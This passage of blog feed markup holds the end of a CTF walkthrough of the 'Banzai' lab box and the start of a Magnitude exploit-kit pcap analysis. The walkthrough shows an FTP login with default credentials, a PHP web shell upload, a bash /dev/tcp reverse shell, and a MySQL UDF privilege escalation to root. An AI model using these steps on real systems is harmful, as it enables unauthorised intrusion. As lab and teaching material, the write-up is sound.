&lt;p&gt;The credentials are: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
Connected to 192.168.127.56.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.127.56:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: admin
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listing all the accessible shares, we discover a potential web server is pointing to this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 ..
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s check if we can upload a malicious PHP file onto the service.&lt;/p&gt;

&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; interactive shell, we run the following command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; put cmback.php
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: cmback.php remote: cmback.php
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
31 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;378.4180 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmback.php&lt;/code&gt; is:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output indicates the file is successfully uploaded, we’ll now move on to enumerating &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service listening on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port 8295&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;http8295&quot;&gt;&lt;strong&gt;HTTP/8295&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Investigate the service, we realize that the files from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; are accessible here.&lt;/p&gt;

&lt;p&gt;To prove the point, we can try to pull the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmback.php&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;This can be done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.127.56:8295/cmback.php

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nothing returns means the file exists. Otherwise, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;404 Not Found&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;remote-code-execution-rce&quot;&gt;Remote Code Execution (RCE)&lt;/h4&gt;
&lt;p&gt;To confirm the RCE is achievable, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.127.56:8295/cmback.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id    
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The remaining steps are ease since we already got code execution.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/$ip/$port 0&amp;gt;&amp;amp;1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s worth to URL-encode the payload.&lt;/p&gt;

&lt;p&gt;As everything is lined up, we are now ready to pull it …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.127.56:8295/cmback.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;bash_revshell_here&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and get a call back after a few seconds.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 8080                                                                                                                                                                         1 ⨯
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.127] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.127.56] 45134
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;707&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@banzai:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;mysql-credentials&quot;&gt;&lt;strong&gt;MySQL Credentials&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Gathering the system locally divulges a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt;, which secure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; credentials of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@banzai:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;config.php 
&amp;lt;?php
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBHOST&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;127.0.0.1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBUSER&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBPASS&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;EscalateRaftHubris123&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBNAME&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;main&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;mysql-udf&quot;&gt;&lt;strong&gt;MySQL UDF&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Further enumeration reveals the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; service is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Defined Function (UDF)&lt;/code&gt; exploit.&lt;/p&gt;

&lt;p&gt;More information can be found: &lt;a href=&quot;https://www.exploit-db.com/exploits/1518&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Steps to reproduce the attacks:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[1].&lt;/strong&gt; Save and upload the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raptor_udf2.c&lt;/code&gt; &lt;a href=&quot;https://www.exploit-db.com/exploits/1518&quot;&gt;exploit&lt;/a&gt; onto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; directory of the target system.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[2].&lt;/strong&gt; Compile &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raptor_udf2.c&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@banzai:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; raptor_udf2.c
www-data@banzai:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wl&lt;/span&gt;,-soname,raptor_udf2.so &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; raptor_udf2.so raptor_udf2.o &lt;span class=&quot;nt&quot;&gt;-lc&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[3].&lt;/strong&gt; Now, we can drop a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; interactive shell with the credentials.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@banzai:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-uroot&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pEscalateRaftHubris123&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[4].&lt;/strong&gt; From the shell, we continue executing …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; use mysql&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; create table foo&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line blob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; insert into foo values&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;load_file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/dev/shm/raptor_udf2.so&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from foo into dumpfile &lt;span class=&quot;s1&quot;&gt;&apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; create &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;do_system returns integer soname &lt;span class=&quot;s1&quot;&gt;&apos;raptor_udf2.so&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from mysql.func&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-----------+-----+----------------+----------+
| name      | ret | dl             | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; |
+-----------+-----+----------------+----------+
mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;chmod +s /bin/bash&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+---------------------------------+
| do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;chmod +s /bin/bash&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and successfully compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; &lt;span class=&quot;se&quot;&gt;\!&lt;/span&gt; sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
bash-4.4# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="linux" /><summary type="html">Summary We’ll obtain the initial access by uploading a reverse shell onto the FTP file share and triggering it via a HTTP web application. We then escalate our privilege by exploiting MySQL UDF vulnerability.</summary></entry><entry><title type="html">Magnitude EK - Traffic Analysis</title><link href="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/" rel="alternate" type="text/html" title="Magnitude EK - Traffic Analysis" /><published>2021-09-19T03:18:51+10:00</published><updated>2021-09-19T03:18:51+10:00</updated><id>https://jayngng.github.io/blog/magnitude-ek---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;You have a pcap, and you need to figure out what’s going on.  What’s happening here?&lt;/li&gt;
  &lt;li&gt;Download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/05/08/2015-05-08-traffic-analysis-exercise.pcap.zip&quot;&gt;here.&lt;/a&gt;
(The password is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; malware-traffic-analysis.net&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;traffic-overview&quot;&gt;&lt;strong&gt;Traffic Overview&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Tools used:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Squert&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpreplay&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;protocol-hierarchy&quot;&gt;&lt;strong&gt;Protocol Hierarchy&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Most of the traffic are generated by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; protocol.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/protocol_hierarchy.png&quot; title=&quot;magnitude_ek/protocol_hierarchy.png&quot; alt=&quot;magnitude_ek/protocol_hierarchy.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;That said, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; is our target of investigation.&lt;/p&gt;

&lt;h4 id=&quot;ip-addresses&quot;&gt;&lt;strong&gt;IP Addresses&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; allows us to summarize the IP addresses engaged in the traffic.&lt;/p&gt;

&lt;p&gt;This can be done by navigating to:
&lt;strong&gt;&lt;em&gt;Statistics -&amp;gt; IPv4 Statistics -&amp;gt; All Addresses&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/ipv4_addresses.png&quot; title=&quot;magnitude_ek/ipv4_addresses.png&quot; alt=&quot;magnitude_ek/ipv4_addresses.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;From the results, we notice two interesting IP addresses:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.138.158&lt;/code&gt; ~ 100%.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;62.75.195.236&lt;/code&gt; ~ 64%.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’ll drop our attention toward those IP addresses during the analyses.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;traffic-analysis&quot;&gt;&lt;strong&gt;Traffic Analysis&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s first have a look at the web-based traffic. From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; filter, enter the following query:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(http.request or ssl.handshake.type == 1) and !(ssdp)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/web_traffic.png&quot; title=&quot;magnitude_ek/web_traffic.png&quot; alt=&quot;magnitude_ek/web_traffic.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The query will only render &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; traffic.&lt;/p&gt;

&lt;p&gt;Within the result, we select the first packet and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, by inspecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 0&lt;/code&gt;, we notice a few suspicious-looking domains.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/stream0.png&quot; title=&quot;magnitude_ek/stream0.png&quot; alt=&quot;magnitude_ek/stream0.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Continuing the analysis towards &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 1&lt;/code&gt;, there are two points catching our attention:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;All the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; traffic on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port 80&lt;/code&gt; is &lt;strong&gt;encrypted&lt;/strong&gt;/&lt;strong&gt;binary&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-shockwave-flash&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/stream1.png&quot; title=&quot;magnitude_ek/stream1.png&quot; alt=&quot;magnitude_ek/stream1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It seems like the victim is downloading an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adobe Flash&lt;/code&gt; application/exploit.&lt;/p&gt;

&lt;p&gt;Upcoming communications are also &lt;strong&gt;encrypted&lt;/strong&gt;/&lt;strong&gt;binary&lt;/strong&gt;. Therefore, we will analyze the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirusTotal&lt;/code&gt; in the next sections.&lt;/p&gt;

&lt;h3 id=&quot;magnitude-ek&quot;&gt;&lt;strong&gt;Magnitude EK&lt;/strong&gt;&lt;/h3&gt;

&lt;h4 id=&quot;snort&quot;&gt;&lt;strong&gt;Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s us employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; to investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; with the following tags:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-q&lt;/code&gt; : for quiet.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A console&lt;/code&gt; : for output to terminal.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; : for a config file.&lt;/li&gt;
